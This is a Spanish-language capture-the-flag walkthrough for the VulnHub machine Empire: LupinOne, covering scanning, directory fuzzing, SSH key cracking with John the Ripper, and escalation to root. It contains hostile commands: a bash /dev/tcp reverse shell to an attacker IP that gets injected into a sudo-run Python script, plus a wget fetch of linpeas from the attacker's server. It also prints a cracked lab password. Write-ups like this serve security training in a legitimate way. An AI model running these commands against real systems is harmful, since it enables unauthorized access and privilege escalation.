
**Nombre de la maquina**
	Empire: Lepin_One
**Dirección de enlace**
	https://www.vulnhub.com/entry/empire-lupinone,750/
**Modo de Red**
	NAT
**Virtualizado**
	VirtualBox

### Recopilación de Información

Al tener en cuenta que la maquina se encuentra en el mismo segmento de red, procedemos a usar el comando **[[Recursos#**netdiscover**|netdiscover]]**.

	netdiscover -r 10.0.2.0/24

![[Pasted image 20240404023116.png]]

Una vez obtenemos un escaneo de la red local, y obtenemos la IP de cada uno de los dispositivos en la red local, debemos a proceder a identificar cual es la maquina que vamos a atacar.

Para poder identificar cual es la maquina objetivo, procedimos a realizar un escaneo con la herramienta **[[Recursos#nmap|nmap]]** en cada una de las IP usando el siguiente comando.

	nmap -sV -p- 10.0.2.7

![[Pasted image 20240404023253.png]]

Al realizar el escaneo determinamos que la IP **10.0.2.7** pertenece a la maquina objetivo.

> [!INFO] Servicios ejecutados en los puertos
>  80 = Detectamos que se esta ejecutando un **Apache con versión 2.4.51**
>  
>  20 = Detectamos que se esta ejecutando una versión de **OpenSSH 8.4p1 Debian 5**

Ahora que sabemos que se esta ejecutando un Apache y el puerto 22 con OpenSSH esta abierto, nos dirigimos a la web para realizar reconocimiento en búsqueda de cualquier indicio de información extra, antes de entrar a través de SSH.

![[Pasted image 20240404023747.png]]

### Enumeración de Directorios

Ya que no hemos logrado encontrar ningún indicio en la pagina, procederemos a realizar una enumeración de directorios web, para ver si logramos detectar rutas ocultas usando la herramienta **[[Recursos#**ffuf**|ffuf]]** con el siguiente comando.

	ffuf -c -w Documents/DiccionarioWeb/SecLists-master/Discovery/Web-Content/common.txt -u http://10.0.2.7/FUZZ

![[Pasted image 20240404025513.png]]

> [!INFO] Comando ffuf
> **-C**  = Configura la cadena de búsqueda que indica una coincidencia.
> **-W** = Especifica la ubicación del archivo a utilizar.
> **-U** = Especifica la URL
> **/FUZZ**  = Reemplazara la palabra FUZZ con todas las palabras guardadas en el archivo.

Ahora comenzaremos a probar las diferentes rutas en búsqueda de cualquier información extra.

![[Pasted image 20240404025611.png]]

Luego de revisar todas las rutas, encontramos que en el directorio **/robots.txt**, nos da información de la existencia de otra ruta, así que vamos a ello.

![[Pasted image 20240404025840.png]]

No nos dejemos engañar, es mas que claro que en ocasiones nos encontraremos con paginas que ocultan los errores con views, como esta... Así que revisemos mas a fondo.

![[Pasted image 20240404030005.png]]

Esto nos da un indicio que hay aun mas rutas, y como indicio principal será realizar otra enumeración de rutas pero esta vez con el símbolo **/~**.

En esta ocasión haremos uso de otro diccionario, y usaremos este comando.

	ffuf -c -w Documents/DiccionarioWeb/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.0.2.7/FUZZ

![[Pasted image 20240404030735.png]]

Casi de manera inmediata, nos encontramos con la ruta **/~secret**, así que vamos a ello.

![[Pasted image 20240404030833.png]]

Si nos damos cuenta hemos detectado 2 puntos claves en esta ruta. Primero que nada ya conocemos el usuario, y también sabemos por defecto que existen directorios a partir de esta ruta, así que nuevamente nos toca ir hacia ello.

Antes de nada hay que tomar en cuenta que lo que buscamos es un **archivo** SSH, por lo cual la ruta debe partir con un **/.FUZZ** y ya que sabemos que tipo de archivo es especificaremos el tipo del archivo para que sea una búsqueda mas rápida.

	ffuf -c -w Documents/DiccionarioWeb/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.0.2.7/~secret/.FUZZ -e .txt, .html

![[Pasted image 20240404032624.png]]

Casi de manera inmediata, nos encontramos con la ruta **/~secret/mysecret.txt**, así que vamos a ello.

![[Pasted image 20240404033031.png]]

### Explotación

Como podemos observar la clave SSH esta cifrada por defecto, así que lo primero debemos hacer es identificar el tipo de cifrado que esta utilizando. Para ello nos apoyamos de: https://www.dcode.fr/cipher-identifier

![[Pasted image 20240404033334.png]]

Ahora que ya sabemos bajo que base este esta cifrado, procedemos a descifrarlo.

![[Pasted image 20240404033457.png]]

Ahora lo ultimo que nos queda es descifrar la clave privada SSH. Para ello ocuparemos la herramienta **[[Recursos#**John The Ripper**|John The Ripper]]**

> [!TIP] SSH Private Key
> Se recomiendo realizar un ataque de diccionario usando John The Ripper para poder localizar la contraseña.
> 
> Nota: Para que John pueda evaluarlo, es necesario convertir el archivo en hash

Procedemos a buscar el archivo .py de john para poder descifrar la contraseña.

	sudo locate ssh2john

![[Pasted image 20240404034423.png]]

	sudo /usr/share/john/ssh2john.py sshkey.txt > hash

![[Pasted image 20240404034656.png]]

Ahora sigue realizar el ataque de fuerza bruta.

	sudo john --wordlist=/usr/share/wordlists/fasttrack.txt hash

![[Pasted image 20240404183346.png]]

> [!WARNING] IMPORTANTE!
> John guarda los resultado del hash y el cifrado, significa que este genera un cache, el cual al volver a descifrar el mismo hash, no te devolverá un resultado.
> 
> Se recomienda verificar la ruta **/root/.john** y eliminar el archivo **/john.pot**

> Oficialmente tenemos:
> 
> user: icex64
> pass: P@55w0rd!
> ssh private key

Si recordamos bien, la dirección IP de la maquina poseía el puerto 22, corriendo un servicio de **[[Recursos#**SSH**|SSH]]** abierto, así que entraremos a través de el con el siguiente comando.

	sudo ssh -i sshkey icex64@10.0.2.7

![[Pasted image 20240405025824.png]]

> [!INFO] Command SSH
> -i = Especifica la ruta de acceso al archivo de clase privada.
> 
> Este comando es necesario ante escenarios donde se prefiere la autentificación basada en claves para una mayor seguridad.

Hemos logramos conexión con éxito!.

Ya que logramos entrar en la maquina objetivo, aun nos falta obtener acceso ROOT!.

El primer paso a realizar es determinar el alcance de privilegios que tiene nuestro usuario, usando sudo.

	sudo -l

![[Pasted image 20240405031203.png]]

En esta ocasión, al tener pocas opciones, necesitamos encontrar la manera de vulnerar la maquina, para ello ocuparemos una herramienta llamada **[linpeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20240331-d41b024f)**. 

![[Pasted image 20240405032911.png]]

A nosotros nos interesa específicamente el archivo **linpeas.sh**, así que una vez lo descargamos, crearemos una carpeta en nuestro directorio con el comando **sudo** y lo movemos ahí.

![[Pasted image 20240405033436.png]]

Ahora, necesitamos cargar ese archivo a la maquina victima, para ello levantaremos un servidor en Python con el siguiente comando.

	sudo python3 -m http.server 80

![[Pasted image 20240405034322.png]]

Una vez levantado, nos vamos a la maquina victima, y nos dirigimos a la ruta **temp/** que es donde cargaremos el archivo linpeas.sh con la herramienta **[[Recursos#**wget**|wget]]**.

	wget 10.0.2.6/linpeas.sh

![[Pasted image 20240405034644.png]]

> [!NOTE] Nota
> Unicamente se coloca **/linpeas.sh** debido a que el servido de python se levanto en el mismo directorio, por lo tanto es el unico archivo que existe.

Ahora, una vez que hemos subido el archivo linpeas, debemos recordar que este aun no tiene ningún tipo de permiso de ejecución, por lo que hay que agregárselo. Para ello usaremos el siguiente comando.

	chmod 777 linpeas.sh

![[Pasted image 20240405034900.png]]

Y ejecutamos.

![[Pasted image 20240405034959.png]]

> [!NOTE] Linpeas
> **LinPEAS es un script que la búsqueda de posibles rutas para escalar privilegios en Linux/Unix*/MacOS los ejércitos.** Los controles se explican en el [libro.hacktricks.xyz](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

Lo que hace este archivo, es buscar vulnerabilidades con respecto a los directorios que nosotros podamos ejecutar.

![[Pasted image 20240405035532.png]]

Ahora, verificaremos al fin que hace el script **webbrowser.py**.

![[Pasted image 20240405040044.png]]

Ahora lo que haremos será realizar una Reverse Shell.

Primero levantamos nuestro netcat.

	sudo nc -lvp 1234

![[Pasted image 20240405041741.png]]

Luego modificamos el script en la maquina victima e integraremos en el código nuestro comando.

	os.system("/bin/bash -c '/bin/bash-i >& /dev/tcp/10.0.2.6/1234 0>&1'")

![[Pasted image 20240405041512.png]]

> [!TIP] Command Reverse Shell Condition
> Recuerda agregar el comando **os.system("/bin/bash")** debajo del "import .."

Ahora, debemos recordar que para ejecutar el script, debemos hacerlo mediante el usuario **arsene**.

![[Pasted image 20240405041926.png]]

Así que ejecutamos el comando.

	sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py

![[Pasted image 20240405043412.png]]

Como podemos observar, hemos pasado del usuario **ixex64** al usuario **arsene**, que es un paso mas cerca del root!.

![[Pasted image 20240405043456.png]]

> [!FAILURE] Importante
> Debes tener en cuenta que aveces la que falla es la maquina en si, asi que debes reiniciarla. En nuestro caso nos mando un mensaje de error, y al salirnos para ir a reiniciarla, inmediatamente se conecto a nuestro netcat.

### Post - Explotación/Escalado de privilegios

Ahora, si notamos bien. Vemos que que nos entrega una ruta llamada **/usr/bin/pip** lo cual podemos explotar por que existe una herramienta para ello y podemos encontrar en  el siguiente enlace **[gtf /bin/pip](https://gtfobins.github.io/gtfobins/pip/)**

![[Pasted image 20240405052921.png]]

Ejecutamos los comandos de **SHELL**

![[Pasted image 20240405053639.png]]

Y hemos conseguido entrar como ROOT!.

![[Pasted image 20240405053944.png]]

